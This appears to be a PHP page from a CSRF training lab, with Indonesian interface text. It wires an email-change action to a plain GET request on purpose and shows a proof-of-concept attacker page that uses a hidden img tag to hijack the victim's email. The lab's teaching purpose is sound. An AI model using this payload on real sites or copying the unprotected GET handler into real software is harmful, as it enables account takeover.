<?php
$title = 'Lab 4: Aksi sensitif lewat GET request';
require_once __DIR__ . '/lib.php';
$db = load_db();
$msg = '';

if (isset($_GET['email']) && is_logged_in()) {
    // VULNERABLE: a state-changing action is wired up to a plain GET
    // request. GET is meant to be a "safe" method (no side effects), so
    // browsers, proxies, link previews, and - critically here - a single
    // <img src="..."> tag will all trigger it without any user interaction.
    $db['user']['email'] = $_GET['email'];
    save_db($db);
    $db = load_db();
    $msg = 'Email berhasil diubah menjadi ' . htmlspecialchars($db['user']['email']);
}

include 'header.php';
if (!is_logged_in()) { echo '<div class="error-box">Login dulu sebagai victim, lalu buka lab ini lagi.</div>'; include 'footer.php'; exit; }

$poc = <<<HTML
<html>
<body>
<!-- Tidak perlu form/JS/onload apa pun - satu tag img sudah cukup -->
<img src="http://localhost:8079/csrf/lab4_get_based.php?email=attacker-owns-this@evil.test" style="display:none">
<p>Halaman ini terlihat tidak berbahaya di browser korban.</p>
</body>
</html>
HTML;
?>

<details class="hint-box">
<summary>Lihat Hint</summary>
<p class="hint">Goal: fitur ubah email di sini "praktis" dibuat menerima GET (supaya bisa
dipakai lewat link langsung), lupa bahwa GET seharusnya cuma untuk operasi yang tidak mengubah
apa pun (safe method). Karena browser memuat <code>&lt;img src&gt;</code> dengan request GET
otomatis begitu halaman dibuka &mdash; tanpa perlu JavaScript, form, atau interaksi apa pun dari
korban &mdash; satu baris HTML ini sudah cukup memicu perubahan email.</p>
</details>

<p>Email saat ini: <strong><?php echo htmlspecialchars($db['user']['email']); ?></strong></p>
<?php if ($msg): ?><div class="ok-box"><?php echo $msg; ?></div><?php endif; ?>

<h3>Form ubah email (legit, tapi lewat GET)</h3>
<form method="get">
  <input type="text" name="email" value="<?php echo htmlspecialchars($db['user']['email']); ?>">
  <button type="submit">Update Email</button>
</form>

<h3>PoC HTML (halaman attacker)</h3>
<textarea readonly rows="6" style="width:100%;font-family:monospace;"><?php echo htmlspecialchars($poc); ?></textarea>

<?php include 'footer.php'; ?>
